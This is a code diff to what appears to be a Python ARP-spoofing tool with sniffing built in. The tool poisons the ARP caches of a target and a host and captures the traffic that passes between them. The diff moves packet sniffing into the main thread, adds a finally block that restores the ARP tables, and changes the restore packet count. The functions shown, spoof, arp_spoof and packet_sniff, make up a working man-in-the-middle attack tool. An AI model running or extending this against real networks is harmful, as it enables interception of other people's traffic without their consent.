@@ -59,7 +59,7 @@ def spoof(target_ip, host_ip, target_mac):
     
 def restore(target_ip, host_ip, target_mac, host_mac): 
     arp_response = ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac) 
-    send(arp_response, verbose=0, count=7) 
+    send(arp_response, verbose=0, count=1) 
 
 def arp_spoof():
     while not stop_flag.is_set():
@@ -73,13 +73,13 @@ def packet_sniff():
 if __name__ == "__main__":
     try:
         arp_thread = threading.Thread(target=arp_spoof)
-        sniff_thread = threading.Thread(target=packet_sniff)
         arp_thread.start()
-        sniff_thread.start()
-        arp_thread.join()
-        sniff_thread.join()
+        packet_sniff()
     except KeyboardInterrupt:
+        pass
+    finally:
         stop_flag.set()
         restore(args.ip_target, args.ip_src, args.mac_target, args.mac_src)
         restore(args.ip_src, args.ip_target, args.mac_src, args.mac_target)
         print("Program stop ARP tables restored")
+        arp_thread.join()
